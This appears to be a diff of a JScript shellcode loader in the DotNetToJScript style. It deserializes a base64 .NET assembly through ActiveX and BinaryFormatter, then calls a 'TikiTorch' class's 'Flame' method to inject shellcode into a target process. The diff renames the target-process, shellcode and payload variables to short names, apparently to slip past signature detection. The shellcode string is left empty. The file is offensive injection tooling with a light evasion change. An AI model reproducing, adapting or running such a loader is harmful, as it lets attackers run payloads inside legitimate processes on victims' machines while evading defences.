@@ -1,6 +1,3 @@
-var targetProcess = "C:\\Program Files\\Internet Explorer\\iexplore.exe";
-var encodedShellcode = "";
-
 function setversion() {
 var shell = new ActiveXObject('WScript.Shell');
 ver = 'v4.0.30319';
@@ -25,7 +22,10 @@ function base64ToStream(b) {
 	return ms;
 }
 
-var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
+var tp = "";
+var sc = "";
+
+var obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+
 "AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+
 "dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+
 "ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+
@@ -250,14 +250,14 @@ var entry_class = 'TikiTorch';
 
 try {
 	setversion();
-	var stm = base64ToStream(serialized_obj);
+	var stm = base64ToStream(obj);
 	var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
 	var al = new ActiveXObject('System.Collections.ArrayList');
 	var n = fmt.SurrogateSelector;
 	var d = fmt.Deserialize_2(stm);
 	al.Add(n);
 	var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
-	o.Flame(targetProcess, encodedShellcode);
+	o.Flame(tp, sc);
 	
 } catch (e) {
     debug(e.message);
